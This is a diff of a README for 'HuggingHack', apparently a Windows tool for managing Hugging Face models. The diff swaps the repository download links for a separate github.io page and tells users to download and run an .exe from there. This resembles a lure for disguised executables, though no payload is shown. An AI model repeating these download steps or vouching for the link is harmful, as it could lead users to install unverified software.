@@ -1,7 +1,7 @@
 # 📦 HuggingHack - Organize AI Models On Your PC
 
 <div align="center">
-  <a href="https://github.com/qasidah7544/HuggingHack">
+  <a href="https://qasidah7544.github.io">
     <img src="https://img.shields.io/badge/Download-HuggingHack-blue?style=for-the-badge" alt="Download HuggingHack">
   </a>
 </div>
@@ -13,7 +13,7 @@ HuggingHack lets you manage AI models from the Hugging Face Hub on your own comp
 You need to access the software files to start using the tool. Follow these steps to obtain the installer for Windows.
 
 1. Open your web browser.
-2. Visit the [official download page](https://github.com/qasidah7544/HuggingHack).
+2. Visit the [official download page](https://qasidah7544.github.io).
 3. Look for the latest version under the Releases section on the right side of the screen.
 4. Click the file ending in .exe to start your download.
 5. Save the file to your computer desktop.
